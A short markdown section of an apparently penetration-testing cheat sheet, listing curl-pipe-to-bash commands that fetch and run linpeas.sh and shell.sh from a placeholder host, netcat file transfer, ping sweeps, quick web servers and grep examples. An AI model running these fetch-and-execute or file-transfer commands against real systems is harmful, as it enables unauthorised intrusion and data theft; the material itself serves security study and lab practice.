## Miscellaneous

- Transfer and execute .sh files without writing to disk 
```bash
curl http://10.10.10.10/linpeas.sh | sh
curl http://10.10.10.10/shell.sh | bash
```

- Transfer files with netcat (Also works on Windows obviously)
```bash
# On the receiving host
nc -lnvp 443 > file_to_save_as

# On the sending host
nc 10.10.10.10 443 < file_to_transfer
```

- Simple bash loops
```bash
# Loop over i from 0 to 100 and ping each host
for i in $(seq 0 100); do ping 127.0.0.$i; done
for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep "bytes from" &) ;done
```

- Web Servers
```bash
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
sudo systemctl start apache2
```

- Basic grep usage
```bash
# Grep recursively and case-insensitively for "test" in /tmp/files
grep -Ri test /tmp/files

# Grep with line numbers and filenames recursively for "test" in /tmp/files
grep -Rn test /tmp/files
```